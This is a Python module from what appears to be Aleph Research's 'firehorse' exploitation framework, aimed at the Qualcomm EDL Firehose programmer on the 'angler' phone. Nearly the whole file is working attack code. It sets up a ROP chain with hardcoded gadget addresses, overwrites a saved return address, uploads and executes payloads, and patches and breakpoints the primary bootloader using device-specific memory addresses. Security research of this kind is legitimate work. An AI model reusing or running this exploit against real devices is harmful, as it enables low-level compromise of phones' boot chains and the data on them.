#
# firehrose
# By Roee Hay & Noam Hadad, Aleph Research
#

import argparse
import time
import re
import sys
import binascii
import subprocess
import os
import struct
import pt
import target
import constants
from log import *
from cmd import *
from fw import Framework as p
from fw import *
from fh import *
import target as t



def rop():
    target = t.get()

    # copy original stack
    p.copy(0xFEC040a0, 0xFEC03F90, 0x256)
    p.copy(0xFEC04098, 0xFEC03F88, 8)

    # gadget_set_sctlr_el3  
    p.poke64(0xFEC04060, 0xF803DF38)

    # saved x1 = 0
    p.poke64(0xFEC04f88, 0)
    
    # gadget_blr_x4
    p.poke64(0xFEC03f90, 0xf800e280)

    # super gadget F803E848
    p.poke64(target.saved_lr_addr, 0xF803E848)


def boom():
    target = t.get()
    p.peek(target.fh_base_programmer, 0x1100)
    I('1')
    p.peek(target.fh_base_programmer, 0x1100)
    I('2')
    p.peek(target.fh_base_programmer, 0x1100)
    I('3')
    p.peek(target.fh_base_programmer, 0x1100)
    I('4')
    #p.sendfile("../device/build/test64.payload", 0xf8048c00)
    I('5')
    #p.poke64(0xfec04098,0xf8048c00)
    I('boom')
    return

def upload_init64():
    target = t.get()
    p.sendfile("../device/build/init64.payload", target.fh_base_programmer)
    p.exe64(target.fh_base_programmer)


def voodoo():
    target = t.get()
    for i in xrange(8):
        print '%d' % i
        p.peek(target.fh_base_programmer, 0x4000)


def upload_fh():
    
    target = t.get()  
    p.sendfile("../device/build/fh64.payload", target.fh_base_programmer)
   # e = XMLHunter(file("../device/build/fh64.payload","rb").read(), target.fh_base_programmer, target)
   # e.send()
    return
    
def upload_fh_data():

    target = t.get()  
  
    bbdb = BasicBlocks(target.basicblocks_db_pbl)    
    bpm = BreakpointManager(bbdb)
    #bpm.bp_programmer(0xF801DAFC, msg="peek0")
    #bpm.bp_programmer(0xF801DA08, msg="poke")
    
    pm = PatchManager()
  #  pm.patch32_programmer(0x1402C958, 0xFFFFFFFF)

    I('applying patches and breakpoints...')

    
    I('creating pagecopy...')
    pages = set()

    I('pages: ' + str(pages))

    pc = PageCopy(MODE_PBL, target.pbl_base_addr, target.pbl_copy_addr, pages, target_pages = [0x807D000, 0x807E000, 0x807F000, 0x807C000, 0x8068000, 0x806e000, 0x807B000])

    I('uploading firehorse data...')
    fh = Firehorse(pm, bpm, pc)
    fhdata = fh.pack()
    fhbin = file("../tmp/fh.bin","wb")
    fhbin.write(fhdata)
    fhbin.close()

    p.sendfile("../tmp/fh.bin", target.fh_base_programmer+target.fh_scratch_offset)

    #e = XMLHunter(fhdata, target.fh_base_programmer+target.fh_scratch_offset, target)
    #e.send()

def init_firehose():
    target = t.get()
    cmd = Commands()

    I('initializing firehorse...')
    p.exe64_cmd(target.fh_base_programmer, cmd.INIT)
   


def hook_handlers():
    target = t.get()
  
    I("Hooking handlers")
    for i in xrange(16):
        I("%d" % i)
        p.sendfile("../device/build/dbgentry64.payload", 0xf803f000+i*0x80)
    

def magic():
    rop()
    voodoo()
    upload_fh_data()
    upload_fh()
    voodoo()
    init_firehose()
    #hook_handlers()


t.add_target(name="angler", arch=64, 
                programmer_path=r"target/angler/prog_emmc_firehose.mbn", 
                peekpoke_style=1, 
                saved_lr=0xF801d214, saved_lr_addr = 0xFEC03f88,
                exe_addr = 0xFEC03f88+0x110,
                pbl_base_addr=0xFC010000,
                page_table_base = 0xfe800000,
                rpm_pbl_base_addr = 0xFC000000,
                modem_pbl_base_addr = 0xFC004000,
                fh_base_programmer = 0xfe824000,
                fh_scratch_offset=0xc000, 
                basicblocks_db_pbl="target/angler/pbl-angler-bbdb.txt",
                rawprogram_xml="target/angler/rawprogram0.xml",
                magic=magic,
                rop=rop,
                uart=0xfe813b70, pt_levels=3, tnsz=32)
